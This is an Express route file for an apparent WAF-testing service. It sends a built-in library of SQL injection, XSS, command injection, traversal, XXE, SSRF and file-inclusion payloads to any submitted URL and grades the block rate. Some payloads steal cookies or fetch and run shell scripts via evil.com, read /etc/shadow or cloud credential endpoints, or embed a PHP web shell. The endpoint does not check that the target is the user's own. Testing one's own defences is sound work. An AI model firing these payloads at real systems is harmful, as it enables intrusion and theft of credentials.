import { Router } from "express";
import { z } from "zod";

const router = Router();

const wafCategories = [
  "sqli",
  "xss",
  "cmd_injection",
  "path_traversal",
  "xxe",
  "ssrf",
  "lfi",
  "rfi",
] as const;

type WafCategory = (typeof wafCategories)[number];

const payloadLibrary: Record<WafCategory, string[]> = {
  sqli: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1; DROP TABLE users--",
    "1 UNION SELECT null,null,null--",
    "1 UNION SELECT user(),null,null--",
    "' AND 1=1--",
    "' AND 1=2--",
    "admin'--",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 AND SLEEP(5)--",
    "1 WAITFOR DELAY '0:0:5'--",
    "'; EXEC xp_cmdshell('whoami')--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' HAVING 1=1--",
    "1 GROUP BY 1--",
    "LOAD_FILE('/etc/passwd')",
  ],
  xss: [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    '"><script>alert(document.cookie)</script>',
    "<iframe src=\"javascript:alert('XSS')\">",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script>fetch('//evil.com/?c='+document.cookie)</script>",
    "<img src=\"x\" onerror=\"this.src='//evil.com/?'+document.cookie\">",
    "<details open ontoggle=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onchange=alert('XSS')><option>XSS",
    "<video><source onerror=alert('XSS')>",
    "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert('XSS')>\">",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
    "<Object Type=\"text/x-scriptlet\" data=\"//evil.com/xss.sct\">",
  ],
  cmd_injection: [
    "; ls -la",
    "| whoami",
    "& id",
    "; cat /etc/passwd",
    "| cat /etc/shadow",
    "&& ls /",
    "; ping -c 1 evil.com",
    "$(whoami)",
    "`id`",
    "| net user",
    "; dir C:\\",
    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "| curl http://evil.com/$(whoami)",
    "; wget http://evil.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s",
    "${IFS}ls${IFS}-la",
    "\\n/bin/sh\\n",
    "1; sleep 5",
    "1 | sleep 5",
    "1 & sleep 5",
    "a;id",
  ],
  path_traversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc//passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
    "....\\....\\....\\windows\\win.ini",
    "/var/www/../../etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/etc/shadow",
    "/etc/hosts",
    "file:///etc/passwd",
    "/etc/nginx/nginx.conf",
    "/etc/apache2/apache2.conf",
    "/app/../../../etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
  ],
  xxe: [
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><test>&xxe;</test>",
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
    "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"expect://id\">]><data>&xxe;</data>",
    "<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY example SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><data>&example;</data>",
    "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><foo>&lol2;</foo>",
    "<?xml?><!DOCTYPE test [<!ENTITY % xxe SYSTEM \"http://evil.com/evil.dtd\">%xxe;]><test>text</test>",
  ],
  ssrf: [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "http://localhost:22",
    "http://127.0.0.1:6379",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://0.0.0.0:80",
    "http://[::1]:80",
    "http://2130706433",
    "http://0x7f000001",
    "http://017700000001",
    "gopher://127.0.0.1:6379/_FLUSHALL%0D%0A",
    "dict://127.0.0.1:11211/stats",
    "file:///etc/passwd",
    "sftp://evil.com:11111/",
    "ldap://evil.com:11211/%0astats%0aquit",
  ],
  lfi: [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "C:\\boot.ini",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
    "expect://id",
    "phar://./pharfile.php",
    "/etc/apache2/apache2.conf",
    "/etc/nginx/nginx.conf",
    "\\\\Windows\\System32\\drivers\\etc\\hosts",
  ],
  rfi: [
    "http://evil.com/shell.php",
    "https://evil.com/shell.php?",
    "http://evil.com/shell.txt",
    "ftp://evil.com/shell.php",
    "\\\\evil.com\\share\\shell.php",
    "//evil.com/shell.php",
    "http://127.0.0.1/shell.php",
    "http://0.0.0.0/shell.php",
    "http://[::1]/shell.php",
    "http://evil.com%00",
  ],
};

const RequestBodySchema = z.object({
  url: z.string().url(),
  categories: z
    .array(z.enum(wafCategories))
    .optional(),
});

function scoreToGrade(blockRate: number): string {
  if (blockRate >= 95) return "A+";
  if (blockRate >= 90) return "A";
  if (blockRate >= 80) return "B";
  if (blockRate >= 70) return "C";
  if (blockRate >= 50) return "D";
  return "F";
}

async function testPayload(
  targetUrl: string,
  payload: string,
  category: string,
  id: string,
): Promise<{
  id: string;
  category: string;
  payload: string;
  status: "blocked" | "passed" | "error";
  statusCode: number | null;
  responseTime: number;
  blocked: boolean;
}> {
  const start = Date.now();
  const testUrl = new URL(targetUrl);
  testUrl.searchParams.set("q", payload);
  testUrl.searchParams.set("search", payload);
  testUrl.searchParams.set("id", payload);

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);

    let status: "blocked" | "passed" | "error" = "passed";
    let statusCode: number | null = null;

    try {
      const response = await fetch(testUrl.toString(), {
        method: "GET",
        signal: controller.signal,
        headers: {
          "User-Agent": "SecurityToolkit/1.0 WAF-Tester",
        },
        redirect: "follow",
      });
      statusCode = response.status;

      if (statusCode === 403 || statusCode === 406 || statusCode === 429 || statusCode === 400 || statusCode === 501) {
        status = "blocked";
      } else {
        status = "passed";
      }
    } catch (fetchErr: unknown) {
      if (fetchErr instanceof Error && fetchErr.name === "AbortError") {
        status = "blocked";
      } else {
        status = "error";
      }
    } finally {
      clearTimeout(timeout);
    }

    return {
      id,
      category,
      payload,
      status,
      statusCode,
      responseTime: Date.now() - start,
      blocked: status === "blocked",
    };
  } catch {
    return {
      id,
      category,
      payload,
      status: "error",
      statusCode: null,
      responseTime: Date.now() - start,
      blocked: false,
    };
  }
}

router.post("/waf/test", async (req, res) => {
  const parsed = RequestBodySchema.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "Invalid request", details: parsed.error.flatten() });
  }

  const { url, categories } = parsed.data;
  const targetCategories = categories ?? wafCategories;

  const allPayloads: Array<{ category: string; payload: string; id: string }> = [];
  for (const cat of targetCategories) {
    const payloads = payloadLibrary[cat as WafCategory] ?? [];
    for (let i = 0; i < payloads.length; i++) {
      allPayloads.push({ category: cat, payload: payloads[i], id: `${cat}-${i}` });
    }
  }

  const batchSize = 10;
  const results: Awaited<ReturnType<typeof testPayload>>[] = [];

  for (let i = 0; i < allPayloads.length; i += batchSize) {
    const batch = allPayloads.slice(i, i + batchSize);
    const batchResults = await Promise.all(
      batch.map((p) => testPayload(url, p.payload, p.category, p.id)),
    );
    results.push(...batchResults);
  }

  const blocked = results.filter((r) => r.blocked).length;
  const passed = results.filter((r) => r.status === "passed").length;
  const errors = results.filter((r) => r.status === "error").length;
  const blockRate = results.length > 0 ? Math.round((blocked / results.length) * 100) : 0;

  return res.json({
    url,
    totalPayloads: results.length,
    blocked,
    passed,
    errors,
    blockRate,
    grade: scoreToGrade(blockRate),
    results,
    testedAt: new Date().toISOString(),
  });
});

export default router;
